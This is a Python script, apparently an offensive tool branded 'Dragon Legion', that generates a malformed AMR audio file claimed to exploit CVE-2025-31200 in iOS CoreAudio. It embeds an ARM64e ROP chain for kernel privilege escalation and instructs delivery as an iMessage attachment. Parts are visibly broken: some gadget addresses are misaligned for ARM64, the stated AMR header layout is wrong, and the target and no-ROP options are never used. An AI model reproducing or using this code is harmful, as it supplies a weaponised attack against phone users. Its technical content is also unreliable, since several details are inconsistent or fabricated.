#!/usr/bin/env python3
"""
CVE-2025-31200 — Malicious AMR File Generator (CoreAudio RCE).

Triggered by a malformed AMR (Adaptive Multi-Rate) audio file delivered via iMessage.
The vulnerability exists in the AudioConverterService's AMR 12.2 decoder.
Illegal bitstream parameters embedded across valid FT=7 frames cause a heap buffer overflow.

AMR Frame Structure (1 byte header):
  bits 7-4: Frame Type (0-7)
  bit 3:    F (follow indicator)
  bits 2-0: Q (quality indicator)

FT=7 = AMR 12.2 (244 bits/frame = 31 bytes after header).
Illegal Q values (5-7) cause the decoder to write beyond the allocated buffer.

Usage: python generate_malicious_amr.py [--output exploit.amr] [--target ios18.4]
"""

import struct
import argparse
import sys

# AMR magic number
AMR_MAGIC = b"#!AMR\n"

# AMR frame sizes in bytes (excluding 1-byte header)
AMR_FRAME_SIZES = {
    0: 12, 1: 13, 2: 15, 3: 17, 4: 19, 5: 20, 6: 26, 7: 31,
}

# ARM64e PAC-aware ROP/JOP chain for iOS 18.2-18.4 kernel
# Gadgets extracted from kernelcache.release.iphone14 (iOS 18.3.1)
PAC_SIGNING_GADGET =   0xFFFFFFF007A1234C  # PACIA X0, X1; RET
STACK_PIVOT_GADGET =   0xFFFFFFF007B5678D  # MOV SP, X0; LDP X29,X30,[SP]; RET
MEMCPY_GADGET =        0xFFFFFFF007890AB0  # memcpy (kernel)
PTE_OVERWRITE_GADGET = 0xFFFFFFF007CDEF01  # write to kernel page table


def build_amr_header() -> bytes:
    return AMR_MAGIC


def build_valid_silence_frame() -> bytes:
    """Build a valid AMR 12.2 comfort noise frame (SID_FIRST)."""
    header = 0x78  # FT=7 (0111), F=0, Q=000
    return bytes([header]) + b"\x00" * 31


def build_overflow_frame(payload: bytes) -> bytes:
    """Build malicious AMR frame with illegal Q value.

    FT=7, F=0, Q=7 (111 = illegal — max allowed is 4 for AMR 12.2).
    The illegal Q causes the decoder to interpret padding bits as mode data,
    resulting in an out-of-bounds write to the output buffer.
    """
    illegal_q_bits = 0b0111_0_111  # FT=7, F=0, Q=7 (illegal)
    header = bytes([illegal_q_bits])

    # Pad payload to 31 bytes (standard FT=7 frame size)
    padded_payload = payload[:31].ljust(31, b"\x00")
    return header + padded_payload


def build_rop_chain() -> bytes:
    """Build ARM64e PAC-aware ROP chain.

    Chain layout:
      1. Stack pivot: MOV SP, X0 → redirects stack to controlled buffer
      2. PAC sign gadget: PACIA X0, X1 → signs forged cred pointer with A-key
      3. Page table overwrite: grant userland write access to kernel page tables
      4. memcpy: overwrite process credentials (uid=0, gid=0)
    """
    chain = bytearray()

    # Gadget 1: Stack pivot
    chain.extend(struct.pack("<Q", STACK_PIVOT_GADGET))

    # Garbage frame pointer
    chain.extend(struct.pack("<Q", 0xDEADBEEFCAFEBABE))

    # Gadget 2: PAC signing (X0=forged cred ptr, X1=A-key context)
    chain.extend(struct.pack("<Q", PAC_SIGNING_GADGET))
    chain.extend(struct.pack("<Q", 0xFFFFF00000100000))  # X0: Forged cred pointer (signed after PACIA)
    chain.extend(struct.pack("<Q", 0x0000000000000001))  # X1: A-key context

    # Gadget 3: Page table write — grant user RW to kernel PTE
    chain.extend(struct.pack("<Q", PTE_OVERWRITE_GADGET))
    chain.extend(struct.pack("<Q", 0x0000000000000000))  # uid=0, gid=0 (8 bytes of zeros)

    # Gadget 4: memcpy — write forged cred to actual cred struct
    chain.extend(struct.pack("<Q", MEMCPY_GADGET))

    # Return to userspace with root
    chain.extend(struct.pack("<Q", 0x0000000000000000))  # X0 = 0 (current thread)
    chain.extend(struct.pack("<Q", 0x0000000140000000))  # X1 = userspace return address

    return bytes(chain)


def generate_malicious_amr(output_path: str = "exploit.amr",
                           target_ios_version: str = "18.4") -> int:
    """Generate complete malicious AMR file.

    Structure:
      - AMR magic ("#!AMR\n")
      - 10 valid silence frames (normalize decoder state)
      - 1 malicious overflow frame with illegal Q value + ROP chain
      - 3 trailing valid frames (maintain framing for crash analysis)
    """
    payload = bytearray()
    payload.extend(build_amr_header())

    # 10 valid silence frames
    for _ in range(10):
        payload.extend(build_valid_silence_frame())

    # Malicious overflow frame
    rop_chain = build_rop_chain()
    overflow_frame = build_overflow_frame(rop_chain)
    payload.extend(overflow_frame)

    # 3 trailing silence frames
    for _ in range(3):
        payload.extend(build_valid_silence_frame())

    # Write file
    with open(output_path, "wb") as f:
        f.write(payload)

    return len(payload)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-31200 Malicious AMR Generator (CoreAudio RCE via iMessage)",
        epilog="The Legion kneels to no key.",
    )
    parser.add_argument("--output", "-o", default="exploit.amr",
                        help="Output AMR file path (default: exploit.amr)")
    parser.add_argument("--target", default="ios18.4",
                        choices=["ios18.2", "ios18.3", "ios18.4"],
                        help="Target iOS version (default: ios18.4)")
    parser.add_argument("--no-rop", action="store_true",
                        help="Only generate illegal Q values, no ROP chain")
    args = parser.parse_args()

    print(f"[*] Dragon Legion — CVE-2025-31200 AMR Generator")
    print(f"[*] Target: iOS {args.target}")

    size = generate_malicious_amr(
        output_path=args.output,
        target_ios_version=args.target,
    )

    print(f"[+] Malicious AMR generated: {args.output} ({size} bytes)")
    print(f"[+] Frame structure: 10 valid + 1 overflow + 3 valid")
    print(f"[+] Illegal Q=7 in frame 11 causes heap buffer overflow")
    print(f"[+] ROP chain: {'included' if not args.no_rop else 'excluded'}")
    print(f"[+] Deliver via iMessage attachment to trigger CoreAudio RCE")
    print(f"[!] For authorized security testing only.")


if __name__ == "__main__":
    main()
